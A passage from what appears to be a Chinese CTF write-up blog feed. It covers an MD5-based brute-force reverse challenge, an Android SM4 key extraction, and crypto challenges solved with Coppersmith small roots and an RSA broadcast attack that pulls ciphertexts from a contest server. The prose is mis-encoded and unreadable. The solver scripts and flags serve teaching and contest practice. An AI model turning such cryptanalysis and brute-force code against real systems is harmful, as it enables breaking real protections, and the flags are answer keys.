class="hljs-built_in">HH</span>(a, b, c, d, x[ <span class="hljs-number">5</span>], <span class="hljs-number">4</span>, <span class="hljs-number">0xfffa3942</span>); <span class="hljs-comment">/* 33 */</span><br> <span class="hljs-built_in">HH</span>(d, a, b, c, x[ <span class="hljs-number">8</span>], <span class="hljs-number">11</span>, <span class="hljs-number">0x8771f681</span>); <span class="hljs-comment">/* 34 */</span><br> <span class="hljs-built_in">HH</span>(c, d, a, b, x[<span class="hljs-number">11</span>], <span class="hljs-number">16</span>, <span class="hljs-number">0x6d9d6122</span>); <span class="hljs-comment">/* 35 */</span><br> <span class="hljs-built_in">HH</span>(b, c, d, a, x[<span class="hljs-number">14</span>], <span class="hljs-number">23</span>, <span class="hljs-number">0xfde5380c</span>); <span class="hljs-comment">/* 36 */</span><br> <span class="hljs-built_in">HH</span>(a, b, c, d, x[ <span class="hljs-number">1</span>], <span class="hljs-number">4</span>, <span class="hljs-number">0xa4beea44</span>); <span class="hljs-comment">/* 37 */</span><br> <span class="hljs-built_in">HH</span>(d, a, b, c, x[ <span class="hljs-number">4</span>], <span class="hljs-number">11</span>, <span class="hljs-number">0x4bdecfa9</span>); <span class="hljs-comment">/* 38 */</span><br> <span class="hljs-built_in">HH</span>(c, d, a, b, x[ <span class="hljs-number">7</span>], <span class="hljs-number">16</span>, <span class="hljs-number">0xf6bb4b60</span>); <span class="hljs-comment">/* 39 */</span><br> <span class="hljs-built_in">HH</span>(b, c, d, a, x[<span class="hljs-number">10</span>], <span class="hljs-number">23</span>, <span class="hljs-number">0xbebfbc70</span>); <span class="hljs-comment">/* 40 */</span><br> <span class="hljs-built_in">HH</span>(a, b, c, d, x[<span class="hljs-number">13</span>], <span class="hljs-number">4</span>, <span class="hljs-number">0x289b7ec6</span>); <span class="hljs-comment">/* 41 */</span><br> <span class="hljs-built_in">HH</span>(d, a, b, c, x[ <span class="hljs-number">0</span>], <span class="hljs-number">11</span>, <span class="hljs-number">0xeaa127fa</span>); <span class="hljs-comment">/* 42 */</span><br> <span class="hljs-built_in">HH</span>(c, d, a, b, x[ <span class="hljs-number">3</span>], <span class="hljs-number">16</span>, <span class="hljs-number">0xd4ef3085</span>); <span class="hljs-comment">/* 43 */</span><br> <span class="hljs-built_in">HH</span>(b, c, d, a, x[ <span class="hljs-number">6</span>], <span class="hljs-number">23</span>,  <span class="hljs-number">0x4881d05</span>); <span class="hljs-comment">/* 44 */</span><br> <span class="hljs-built_in">HH</span>(a, b, c, d, x[ <span class="hljs-number">9</span>], <span class="hljs-number">4</span>, <span class="hljs-number">0xd9d4d039</span>); <span class="hljs-comment">/* 45 */</span><br> <span class="hljs-built_in">HH</span>(d, a, b, c, x[<span class="hljs-number">12</span>], <span class="hljs-number">11</span>, <span class="hljs-number">0xe6db99e5</span>); <span class="hljs-comment">/* 46 */</span><br> <span class="hljs-built_in">HH</span>(c, d, a, b, x[<span class="hljs-number">15</span>], <span class="hljs-number">16</span>, <span class="hljs-number">0x1fa27cf8</span>); <span class="hljs-comment">/* 47 */</span><br> <span class="hljs-built_in">HH</span>(b, c, d, a, x[ <span class="hljs-number">2</span>], <span class="hljs-number">23</span>, <span class="hljs-number">0xc4ac5665</span>); <span class="hljs-comment">/* 48 */</span><br> <br> <span class="hljs-comment">/* Round 4 */</span><br> <span class="hljs-built_in">II</span>(a, b, c, d, x[ <span class="hljs-number">0</span>], <span class="hljs-number">6</span>, <span class="hljs-number">0xf4292244</span>); <span class="hljs-comment">/* 49 */</span><br> <span class="hljs-built_in">II</span>(d, a, b, c, x[ <span class="hljs-number">7</span>], <span class="hljs-number">10</span>, <span class="hljs-number">0x432aff97</span>); <span class="hljs-comment">/* 50 */</span><br> <span class="hljs-built_in">II</span>(c, d, a, b, x[<span class="hljs-number">14</span>], <span class="hljs-number">15</span>, <span class="hljs-number">0xab9423a7</span>); <span class="hljs-comment">/* 51 */</span><br> <span class="hljs-built_in">II</span>(b, c, d, a, x[ <span class="hljs-number">5</span>], <span class="hljs-number">21</span>, <span class="hljs-number">0xfc93a039</span>); <span class="hljs-comment">/* 52 */</span><br> <span class="hljs-built_in">II</span>(a, b, c, d, x[<span class="hljs-number">12</span>], <span class="hljs-number">6</span>, <span class="hljs-number">0x655b59c3</span>); <span class="hljs-comment">/* 53 */</span><br> <span class="hljs-built_in">II</span>(d, a, b, c, x[ <span class="hljs-number">3</span>], <span class="hljs-number">10</span>, <span class="hljs-number">0x8f0ccc92</span>); <span class="hljs-comment">/* 54 */</span><br> <span class="hljs-built_in">II</span>(c, d, a, b, x[<span class="hljs-number">10</span>], <span class="hljs-number">15</span>, <span class="hljs-number">0xffeff47d</span>); <span class="hljs-comment">/* 55 */</span><br> <span class="hljs-built_in">II</span>(b, c, d, a, x[ <span class="hljs-number">1</span>], <span class="hljs-number">21</span>, <span class="hljs-number">0x85845dd1</span>); <span class="hljs-comment">/* 56 */</span><br> <span class="hljs-built_in">II</span>(a, b, c, d, x[ <span class="hljs-number">8</span>], <span class="hljs-number">6</span>, <span class="hljs-number">0x6fa87e4f</span>); <span class="hljs-comment">/* 57 */</span><br> <span class="hljs-built_in">II</span>(d, a, b, c, x[<span class="hljs-number">15</span>], <span class="hljs-number">10</span>, <span class="hljs-number">0xfe2ce6e0</span>); <span class="hljs-comment">/* 58 */</span><br> <span class="hljs-built_in">II</span>(c, d, a, b, x[ <span class="hljs-number">6</span>], <span class="hljs-number">15</span>, <span class="hljs-number">0xa3014314</span>); <span class="hljs-comment">/* 59 */</span><br> <span class="hljs-built_in">II</span>(b, c, d, a, x[<span class="hljs-number">13</span>], <span class="hljs-number">21</span>, <span class="hljs-number">0x4e0811a1</span>); <span class="hljs-comment">/* 60 */</span><br> <span class="hljs-built_in">II</span>(a, b, c, d, x[ <span class="hljs-number">4</span>], <span class="hljs-number">6</span>, <span class="hljs-number">0xf7537e82</span>); <span class="hljs-comment">/* 61 */</span><br> <span class="hljs-built_in">II</span>(d, a, b, c, x[<span class="hljs-number">11</span>], <span class="hljs-number">10</span>, <span class="hljs-number">0xbd3af235</span>); <span class="hljs-comment">/* 62 */</span><br> <span class="hljs-built_in">II</span>(c, d, a, b, x[ <span class="hljs-number">2</span>], <span class="hljs-number">15</span>, <span class="hljs-number">0x2ad7d2bb</span>); <span class="hljs-comment">/* 63 */</span><br> <span class="hljs-built_in">II</span>(b, c, d, a, x[ <span class="hljs-number">9</span>], <span class="hljs-number">21</span>, <span class="hljs-number">0xeb86d391</span>); <span class="hljs-comment">/* 64 */</span><br>     state[<span class="hljs-number">0</span>] += a;<br>     state[<span class="hljs-number">1</span>] += b;<br>     state[<span class="hljs-number">2</span>] += c;<br>     state[<span class="hljs-number">3</span>] += d;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹åŠ å¯†ç»“æœè¿›è¡Œäº†å¤„ç†ï¼Œè°ƒè¯•å‘ç°ä»–åŠ å¯†çš„ç»“æœå°±æ˜¯æˆ‘ä»¬é€‰æ‹©çš„åŠ¨ç‰©çš„å…¨ç§°ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬é€‰æ‹©1åˆ™åŠ å¯†dogã€‚æ‰€ä»¥ç¨‹åºé€»è¾‘å°±æ˜¯ç”¨åŠ¨ç‰©åå­—åŠ å¯†ï¼Œç„¶åå˜å¼‚çš„md5åŠ å¯†åå’Œå¯†æ–‡æ¯”è¾ƒï¼Œå¦‚æœæ¯”è¾ƒæˆåŠŸå°±æ˜¯å¯¹çš„åŠ¨ç‰©åå­—ï¼Œç”¨è¿™ä¸ªåå­—çš„åºå·å†åŠ å¯†md5ï¼Œæœ€åå†™expçˆ†ç ´ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;md5.c&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> status;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> selemtype;<br><span class="hljs-type">char</span> choices[][<span class="hljs-number">10</span>] = &#123;<br>    <span class="hljs-string">&quot;cat&quot;</span>,<br>    <span class="hljs-string">&quot;dog&quot;</span>,<br>    <span class="hljs-string">&quot;fox&quot;</span>,<br>    <span class="hljs-string">&quot;panda&quot;</span>,<br>    <span class="hljs-string">&quot;dragon&quot;</span>,<br>    <span class="hljs-string">&quot;monkey&quot;</span><br>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> answer[] = &#123;<br>    <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x85</span>,<br>    <span class="hljs-number">0x46</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x18</span><br>&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span> </span>&#123;<br>    MD5_CTX md5;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> md5_str[<span class="hljs-number">32</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> length = <span class="hljs-number">9</span>;  <br><br>    <span class="hljs-type">int</span> choice[length]; <br><br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>        choice[i] = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-type">char</span> animalName[length * <span class="hljs-number">10</span> + <span class="hljs-number">1</span>];  <br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>            <span class="hljs-type">int</span> choiceIndex = choice[i];<br>            <span class="hljs-type">char</span> *animal = choices[choiceIndex];<br>            <span class="hljs-keyword">while</span> (*animal != <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br>                animalName[index] = *animal;<br>                animal++;<br>                index++;<br>            &#125;<br>        &#125;<br>        animalName[index] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">16</span> ; i ++ )<br>        &#123;<br>            md5_str[i]=<span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-built_in">MD5Init</span>(&amp;md5);<br>        <span class="hljs-built_in">MD5Update</span>(&amp;md5, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)animalName, <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span> *)animalName));<br>        <span class="hljs-built_in">MD5Final</span>(&amp;md5, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)md5_str);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">16</span> ; i ++ ) &#123;<br>            md5_str[i] = (md5_str[i] &amp; <span class="hljs-number">0xE9</span> | ~md5_str[i] &amp; <span class="hljs-number">0x16</span>);<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">16</span> ; i ++ )<br>        &#123;<br>            <span class="hljs-keyword">if</span>(md5_str[i]!=answer[i])<br>            &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">5</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,animalName);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>            <br>        <br>        <span class="hljs-type">int</span> i = length - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (i &gt;= <span class="hljs-number">0</span> &amp;&amp; choice[i] == <span class="hljs-number">5</span>) &#123;<br>            choice[i] = <span class="hljs-number">0</span>;<br>            i--;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        choice[i]++;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-comment">//catmonkeydogdragondogcatfoxpandapanda</span><br><span class="hljs-comment">//051410233</span><br></code></pre></td></tr></table></figure><p>æ‰¾å‡ºç›¸åº”åºå·ç„¶åmd5åŠ å¯†å¥—ä¸Šflag{}å³å¯<br><code>flag&#123;839c998c52db6618bb24c346b85a894f&#125;</code></p><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><p>ç”¨jadxåˆ†ææ— æœï¼Œè§£å‹å»åˆ†æsoå±‚æ–‡ä»¶ï¼Œåœ¨<code>libjniex.so</code>å‘ç°<code>decrypt</code>å‡½æ•°<br><img src="/mdimg/2023hwsummer/9.png"><br>è·Ÿè¿›å»å‘ç°ä¸ºSM4å¯†ç ï¼Œå¹¶å‘ç°å¯†æ–‡ã€‚<br><img src="/mdimg/2023hwsummer/10.png"><br>è£…ä¸äº†æ¨¡æ‹Ÿå™¨ï¼Œæ‰‹æœºå®‰è£…è¿è¡ŒAPKæ–‡ä»¶å³å¯çœ‹åˆ°key:<code>159762dr7vh438sa</code>iv:<code>1313131313131313</code><br><img src="/mdimg/2023hwsummer/11.jpeg"><br><img src="/mdimg/2023hwsummer/12.jpeg"><br>èµ›åšå¨å­ç›´æ¥SM4è§£å¯†å°±å¯ä»¥ã€‚<br><img src="/mdimg/2023hwsummer/13.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é»„æ²³å…¬å®‰ç½‘å®‰æŒ‘æˆ˜èµ›</title>
    <link href="/2023/03/12/%E9%BB%84%E6%B2%B3/"/>
    <url>/2023/03/12/%E9%BB%84%E6%B2%B3/</url>
    
    <content type="html"><![CDATA[<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="1-EasyNumber"><a href="#1-EasyNumber" class="headerlink" title="1. EasyNumber"></a>1. EasyNumber</h3><h4 id="é¢˜ç›®è¯´æ˜"><a href="#é¢˜ç›®è¯´æ˜" class="headerlink" title="é¢˜ç›®è¯´æ˜"></a>é¢˜ç›®è¯´æ˜</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>m = bytes_to_long(flag)<br><span class="hljs-keyword">assert</span> m.bit_length() &lt; <span class="hljs-number">200</span><br>B = getPrime(<span class="hljs-number">1024</span>)<br>A = (<span class="hljs-number">2022</span>-<span class="hljs-number">2023</span>*m) % B<br>leak = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2023</span>, B)<br><span class="hljs-built_in">print</span>(A)<br><span class="hljs-built_in">print</span>(leak)<br><span class="hljs-comment"># 170552035590584371794277768762390230763544207477112166060533204313753004629936685595405184205281232276007015670211368033442806936779308867580378436822021847321737051586882192693878924902157737728943995367527577690099125847661701232120507334675776645787433344767625337798357285176902699598449086385213291366162</span><br><span class="hljs-comment"># 66573767005779268080495621179078972426265588843146030764009851250207246081886465887129685885427908408673076322868864723505267053962926489662364269721110570269848306490343161117767892544708463436083630857549295570803296389232068947551581525974801496469745646172924950992026908012083467414933570463776905332979</span><br></code></pre></td></tr></table></figure><h4 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br>A = <span class="hljs-number">170552035590584371794277768762390230763544207477112166060533204313753004629936685595405184205281232276007015670211368033442806936779308867580378436822021847321737051586882192693878924902157737728943995367527577690099125847661701232120507334675776645787433344767625337798357285176902699598449086385213291366162</span><br>leak = <span class="hljs-number">66573767005779268080495621179078972426265588843146030764009851250207246081886465887129685885427908408673076322868864723505267053962926489662364269721110570269848306490343161117767892544708463436083630857549295570803296389232068947551581525974801496469745646172924950992026908012083467414933570463776905332979</span><br>n = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2023</span>) - leak<br>R.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = <span class="hljs-number">2022</span> - <span class="hljs-number">2023</span> * x - A<br>ans = f.monic().small_roots(X=<span class="hljs-number">2</span>**<span class="hljs-number">200</span>, beta=<span class="hljs-number">0.4</span>, epsilon=<span class="hljs-number">0.04</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(ans[<span class="hljs-number">0</span>]))[<span class="hljs-number">2</span>:]))<br><br><span class="hljs-comment">#b&#x27;flag&#123;unknown_modulus&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="2-RRRRRRRSA"><a href="#2-RRRRRRRSA" class="headerlink" title="2. RRRRRRRSA"></a>2. RRRRRRRSA</h3><h4 id="é¢˜ç›®è¯´æ˜-1"><a href="#é¢˜ç›®è¯´æ˜-1" class="headerlink" title="é¢˜ç›®è¯´æ˜"></a>é¢˜ç›®è¯´æ˜</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>e = <span class="hljs-number">321</span><br>m = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-built_in">print</span>(c)<br></code></pre></td></tr></table></figure><h4 id="è§£é¢˜æ€è·¯-1"><a href="#è§£é¢˜æ€è·¯-1" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>host, port = <span class="hljs-string">&#x27;81.68.77.181 2023&#x27;</span>.split()<br>n, c = [], []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">321</span>):<br>    io = remote(host, <span class="hljs-built_in">int</span>(port))<br>    n += [<span class="hljs-built_in">int</span>(io.recvline().strip().decode())]<br>    c += [<span class="hljs-built_in">int</span>(io.recvline().strip().decode())]<br>    io.close()<br>    sleep(<span class="hljs-number">0.1</span>)<br><br>e = <span class="hljs-number">321</span><br>res = crt(c, n)<br><span class="hljs-built_in">print</span>(res.nbits())<br>R.&lt;x&gt; = PolynomialRing(ZZ)<br>f = x^e - res<br>m = f.roots()[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-comment"># flag&#123;aea15f90-aa1b-424d-a1ca-cda30682d881&#125;</span><br></code></pre></td></tr></table></figure><h3 id="3-My-enc"><a href="#3-My-enc" class="headerlink" title="3. My_enc"></a>3. My_enc</h3><h4 id="é¢˜ç›®è¯´æ˜-2"><a href="#é¢˜ç›®è¯´æ˜-2" class="headerlink" title="é¢˜ç›®è¯´æ˜"></a>é¢˜ç›®è¯´æ˜</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Cyber_key</span>(<span class="hljs-params">LEN</span>):<br>    Key = [[] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(row)]<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(row):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(LEN):<br>            Key[x].append(random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">2023</span>))<br>    <span class="hljs-keyword">return</span> Key<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Punk_enc</span>(<span class="hljs-params">Key, msg</span>):<br>    out = []<br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> Key:<br>        s = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(l, msg):<br>            s += (x * y) % P<br>            s %= P<br>        out.append(s)<br>    <span class="hljs-keyword">return</span> out<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    P = <span class="hljs-number">2048</span><br>    row = <span class="hljs-number">66</span><br>    key = Cyber_key(<span class="hljs-built_in">len</span>(flag))<br>    c = Punk_enc(key, flag)<br>    <span class="hljs-built_in">print</span>(key)<br>    <span class="hljs-built_in">print</span>(c)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[[505, 469, 528, 1798, 373, 987, 981, 438, 1438, 1918, 768, 980, 720, 336, 1763, 585, 1582, 1020, 601, 1543, 1374, 1904, 340, 326, 947, 639, 1143, 371, 359, 953, 74, 657, 13, 359, 280, 1903, 687, 371, 114, 1232, 1573, 743], [1310, 205, 491, 137, 1743, 1185, 74, 1797, 867, 755, 967, 454, 800, 568, 625, 492, 1835, 1586, 1462, 619, 760, 1144, 98, 1764, 1356, 991, 1392, 816, 849, 259, 1305, 842, 1250, 1983, 1339, 752, 1170, 1976, 958, 1710, 1216, 1927], [1507, 1699, 1536, 1708, 739, 902, 1169, 1352, 886, 680, 1400, 1011, 132, 1561, 1001, 772, 1809, 208, 1161, 1691, 2015, 1099, 166, 1571, 551, 847, 663, 749, 1634, 1487, 960, 1675, 1017, 109, 63, 1714, 1540, 1515, 1382, 1569, 851, 985], [451, 1919, 680, 76, 707, 1283, 933, 658, 945, 1801, 352, 673, 1072, 48, 1994, 1923, 1685, 1684, 1374, 28, 1774, 1769, 1388, 1541, 604, 107, 1290, 787, 1622, 711, 323, 1846, 317, 1519, 1426, 123, 2015, 861, 544, 1401, 1869, 1833], [862, 1316, 393, 1190, 2012, 687, 78, 61, 1391, 1238, 1282, 866, 1385, 1200, 292, 1702, 1599, 712, 1108, 653, 1711, 745, 100, 275, 322, 1671, 1723, 895, 661, 1726, 497, 342, 1010, 47, 1204, 1911, 1734, 1567, 1892, 954, 386, 1996], [1333, 1928, 191, 1502, 1106, 579, 779, 512, 313, 308, 1277, 1547, 1814, 1434, 1867, 670, 543, 404, 1570, 179, 555, 1896, 289, 492, 1874, 1190, 1885, 748, 1375, 401, 1685, 618, 1614, 288, 2017, 571, 670, 873, 98, 563, 